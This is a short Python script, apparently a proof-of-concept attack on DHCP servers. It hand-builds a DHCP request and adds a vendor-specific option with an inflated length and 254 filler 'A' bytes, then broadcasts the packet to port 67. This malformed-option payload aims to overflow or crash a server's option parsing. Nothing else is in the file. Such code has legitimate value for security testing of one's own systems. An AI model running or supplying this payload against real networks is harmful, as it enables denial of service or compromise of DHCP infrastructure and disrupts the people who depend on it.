from socket import *
import struct
import os
 
dhcp_request = (
    "\x01\x01\x06\x00\xd5\xa6\xa8\x0c\x00\x00\x80\x00\x00\x00\x00\x00" \
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x63\x82\x53\x63" \
    "\x35\x01\x01\x2b\x0b\x68\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64\xff"
)
 
dhcp_request = dhcp_request[:-1]        #remove end byte (0xFF)
dhcp_request += struct.pack('=B', 0x2B) #vendor specific option code
dhcp_request += struct.pack('=B', 0xFF) #vendor specific option size
dhcp_request += "A"*254                 #254 bytes of As
dhcp_request += struct.pack('=B', 0xFF) #packet end byte
 
s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP) #DHCP is UDP
s.bind(('0.0.0.0', 0))
s.setsockopt(SOL_SOCKET, SO_BROADCAST, 1)    #put socket in broadcast mode
 
s.sendto(dhcp_request, ('255.255.255.255', 67)) #broadcast DHCP packet on port 67
